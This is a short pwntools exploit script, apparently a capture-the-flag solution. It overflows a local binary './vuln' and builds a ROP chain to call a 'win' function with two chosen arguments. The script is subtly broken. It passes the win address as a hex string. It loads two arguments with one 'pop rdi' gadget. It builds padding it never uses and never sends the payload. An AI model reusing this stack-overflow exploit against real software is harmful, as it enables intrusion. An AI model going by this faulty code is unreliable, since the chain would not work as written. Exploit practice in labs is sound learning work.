from pwn import *

# variables
VULNERABLE = ELF('./vuln')              # binary file
context.binary = VULNERABLE             # context.binary
WIN = hex(VULNERABLE.symbols['win'])    # win function adress
ARG1 = 0xF2CCAD1F                       # agr1 value
ARG2 = 0xA28764DD                       # arg2 value

#
#
#

cyclic(200)                             # inject cyclic output to program
rbp_value = 0x6261616562616164          # GDB -> info registers -> rbp
n = cyclic_find(rbp_value)              # find padding
padding = n * 'A'                       # padding based on cyclic_find()
padding += 'BBBBCCCC'                   # add an 8 bytes padding to overflow rbp

#
#
#

rop_elf = ROP(VULNERABLE)
pop_rdi = rop_elf.find_gadget(["pop rdi", "ret"]).address
ret = rop_elf.find_gadget(['ret']).address
PAYLOAD = flat(
    b'A' * (n+8),
    pop_rdi,
    ARG2,
    ARG1,
    ret,
    WIN,
)

#
#
#

if args.GDB:
    p = gdb.debug(VULNERABLE.path)
else:
    p = VULNERABLE.process()

print(PAYLOAD)
